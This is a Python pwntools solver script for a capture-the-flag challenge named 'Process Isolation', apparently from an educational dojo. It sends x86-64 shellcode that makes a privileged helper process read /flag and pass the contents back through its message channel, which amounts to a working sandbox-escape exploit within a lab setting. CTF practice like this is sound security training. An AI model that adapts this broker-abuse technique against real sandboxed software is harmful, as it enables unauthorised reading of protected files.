# Process Isolation
import pwn
from dojotool import find_challenge
from dojotool.pwntool import tee


def one_round(io: pwn.process) -> None:
    child_fd = 4

    # write(4, "read_file\\0/flag\\0...", 128)
    # read(4, response + 10, 118)
    # write(4, "print_msg\\0<flag>...", 128)
    shellcode = pwn.asm(f"""
        /* write(child_fd, request, 128) */
        mov eax, 1
        mov edi, {child_fd}
        lea rsi, [rip + request]
        mov edx, 128
        syscall

        /* read(child_fd, response_arg, 128) */
        mov eax, 0
        lea rsi, [rip + response_arg]
        mov edx, 128
        syscall

        /* write(child_fd, response, 128) */
        mov eax, 1
        lea rsi, [rip + response]
        mov edx, 128
        syscall

    request:
        .ascii "read_file"
        .byte 0
        .asciz "/flag"
        .zero 128

    response:
        .ascii "print_msg"
        .byte 0

    response_arg:
        .zero 128
    """)

    io.send(shellcode)


def ctf() -> None:
    root_bin = find_challenge()
    with pwn.process(root_bin, raw=True, level="error") as io:
        tee(io)
        try:
            one_round(io)
            io.recvrepeat()
        except Exception:
            io.recvrepeat(0.5)
            raise


if __name__ == "__main__":
    ctf()
